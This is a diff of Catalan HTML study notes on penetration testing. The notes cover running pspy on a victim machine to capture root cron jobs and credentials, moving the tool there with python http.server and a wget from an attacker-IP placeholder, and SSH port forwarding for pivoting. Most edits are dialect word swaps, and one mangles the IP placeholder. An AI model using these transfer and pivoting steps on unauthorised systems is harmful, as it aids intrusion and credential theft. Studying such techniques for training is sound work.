@@ -402,14 +402,14 @@ processos en execució. Ho fa de forma contínua i ràpida per capturar fins i t
 <p>Permet detectar tasques programades (crons) que s'executen com a root, de vegades els processos s'executen amb contrasenyes o tokens com a 
   arguments a la línia de comandes, i pspy els captura. pspy pot veeure quins processos s'executen periòdicament sense haver d'accedir a /etc/cron* directament </p>
   <p>Pspy és un projecte de codi obert allotjat a GitHub. El pots trobar aquí: <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>   </p>
-   <p>Per fer servir <code>pspy </code> el flux habitual és baixar-lo primer a la teva màquina atacant i després transferir-lo a la màquina víctima. 
+   <p>Per fer servir <code>pspy </code> el flux habitual és baixar-lo primer a la teua màquina atacant i després transferir-lo a la màquina víctima. 
     Després donar-li permisos d'execució (a la màquina víctima) i executar-lo</p>
-    <p>Una forma ràpida de transferir-lo a la víctima és muntar un servidor HTTP des de la teva màquina amb</p>
-    <pre># A la teva màquina atacant
+    <p>Una forma ràpida de transferir-lo a la víctima és muntar un servidor HTTP des de la teua màquina amb</p>
+    <pre># A la teua màquina atacant
 python3 -m http.server 8080
 
 # A la màquina víctima
-wget http://LA_TEVA_IP:8080/pspy64     </pre>
+wget http://LA_teua_IP:8080/pspy64     </pre>
 
     <p></p>
 
@@ -668,7 +668,7 @@ drwxrwxrwt 11 root root 4096 mar  6 15:25 /var/tmp
       <p>El trànsit “viatja dins” d’un altre protocol, Permet evitar restriccions de xarxa, Molt comú en xarxes corporatives</p>
       
       <h3>Local Port Forwarding</h3>
-        <p>El local port forwarding permet: Obrir un port a la teva màquina local que redirigeix el trànsit a un servei remot, a través d’un servidor intermedi (pivot).</p>
+        <p>El local port forwarding permet: Obrir un port a la teua màquina local que redirigeix el trànsit a un servei remot, a través d’un servidor intermedi (pivot).</p>
         <p>És molt útil quan: Un servei no és accessible directament, però sí que és accessible des del servidor pivot</p>
 
       <ul> Escenari d’exemple 
@@ -682,17 +682,17 @@ ssh -L 13306:10.0.0.50:3306 user@pivot.company.local </pre>
 
       <ul>
         <li>-L  : Indica local port forwarding</li>
-        <li>13306  :  Port local que s’obrirà a la teva màquina (tu et connectaràs a aquest port)</li>
+        <li>13306  :  Port local que s’obrirà a la teua màquina (tu et connectaràs a aquest port)</li>
         <li>10.0.0.50:3306 :   Destí final intern ( IP interna,  Port del servei (ex. MySQL))</li>
         <li>user@pivot.company.local :  Servidor intermedi (pivot) . És qui té accés a la xarxa interna</li>
       </ul>
 
       <h3>Remote Port Forwarding</h3>
-      <p>El remote port forwarding permet: Obrir un port en el servidor remot que redirigeix el trànsit cap a un servei accessible des de la teva màquina local (o una altra màquina).
+      <p>El remote port forwarding permet: Obrir un port en el servidor remot que redirigeix el trànsit cap a un servei accessible des de la teua màquina local (o una altra màquina).
         És l’opció inversa del local port forwarding.</p>
 
       <ul>Escenari d’exemple
-        <li>La teva màquina local: té un servei web a 127.0.0.1:8080</li>
+        <li>La teua màquina local: té un servei web a 127.0.0.1:8080</li>
         <li>Servidor remot: pivot.company.local</li>
         <li>El servidor remot no pot accedir directament al teu servei local</li>
         <li>Objectiu: exposar el teu servei local a través del servidor remot</li>
@@ -703,7 +703,7 @@ ssh -R 9000:127.0.0.1:8080 user@pivot.company.local  </pre>
       <ul>
         <li>-R :  Indica remote port forwarding</li>
         <li>9000 : Port que s’obrirà al servidor remot</li>
-        <li>127.0.0.1:8080  :  Destí local (127.0.0.1 → la teva màquina )  (8080 → el servei que ja està escoltant localment)</li>
+        <li>127.0.0.1:8080  :  Destí local (127.0.0.1 → la teua màquina )  (8080 → el servei que ja està escoltant localment)</li>
         <li>user@pivot.company.local :   Servidor remot on es crea el port</li>
       </ul>
       <p>👉 Qualsevol que accedisca a pivot.company.local:9000 , estarà accedint indirectament al teu servei local.</p>
